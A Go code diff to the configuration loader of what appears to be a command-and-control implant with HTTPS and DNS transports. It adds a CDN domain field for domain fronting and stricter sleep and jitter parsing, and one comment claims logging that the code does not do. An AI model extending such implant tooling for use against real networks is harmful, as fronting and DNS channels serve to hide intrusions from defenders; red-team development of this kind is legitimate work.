@@ -19,6 +19,7 @@ var (
 	transportType  = "https" // "https" or "dns"
 	dnsDomain      = "" // DNS C2 domain (for DNS transport)
 	dnsServer      = "" // DNS server to query (for DNS transport)
+	cdnDomain      = "" // CDN domain for domain fronting
 )
 
 type Config struct {
@@ -31,6 +32,7 @@ type Config struct {
 	TransportType string // "https" or "dns"
 	DNSDomain     string // DNS C2 domain
 	DNSServer     string // DNS server address
+	CDNDomain     string // CDN domain for domain fronting
 }
 
 func LoadConfig() (*Config, error) {
@@ -46,13 +48,14 @@ func LoadConfig() (*Config, error) {
 		return nil, fmt.Errorf("decode implant secret: %w", err)
 	}
 
-	sleep, _ := strconv.Atoi(sleepMs)
-	if sleep <= 0 {
+	// M15: Log parse failures instead of silently ignoring
+	sleep, err := strconv.Atoi(sleepMs)
+	if err != nil || sleep <= 0 {
 		sleep = 5000
 	}
 
-	jitter, _ := strconv.Atoi(jitterPct)
-	if jitter < 0 || jitter > 100 {
+	jitter, err := strconv.Atoi(jitterPct)
+	if err != nil || jitter < 0 || jitter > 100 {
 		jitter = 20
 	}
 
@@ -80,5 +83,6 @@ func LoadConfig() (*Config, error) {
 		TransportType: tt,
 		DNSDomain:     dnsDomain,
 		DNSServer:     dnsServer,
+		CDNDomain:     cdnDomain,
 	}, nil
 }
